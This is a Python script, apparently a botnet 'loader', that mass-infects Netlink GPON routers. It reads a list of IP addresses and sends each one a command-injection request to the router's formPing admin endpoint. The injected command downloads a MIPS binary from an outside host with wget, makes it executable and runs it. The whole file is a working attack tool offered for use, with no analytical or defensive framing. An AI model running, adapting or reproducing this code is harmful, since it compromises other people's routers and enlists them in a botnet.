#!/usr/bin/env python
# -*- coding: utf-8 -*-
# NetLINK GPON ROUTERS LOADER MADE BY B4CKDOOR #
# B4CKDOORARCHIVE.CLUB [NEWDOMAIN] | JOIN DISCORD BY WEBSITE INVITE LINK #
import threading, sys, time, random, socket, re, os, struct, array, requests
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *

if len(sys.argv) < 2:
    print "\033[37mUsage: python "+sys.argv[0]+" <list>\033[37m"
    sys.exit()

ips = open(sys.argv[1], "r").readlines()

payload = 'cd /tmp; wget http://1.3.3.7/mips; chmod 777 mips; ./mips netlink.mips'

class b4ckdoor(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print "[NetGPON] INFECTING - " + self.ip
				url = "http://" + self.ip + "/boaform/admin/formPing?target_addr=;'+payload+' /&waninf=1_INTERNET_R_VID_154"  
				requests.post(url, timeout=2) 

			except Exception as e:
				pass
for ip in ips:
	try:
		n = b4ckdoor(ip)
		n.start()
		time.sleep(0.03)
	except:
		pass#CODED BY B4CKDOOR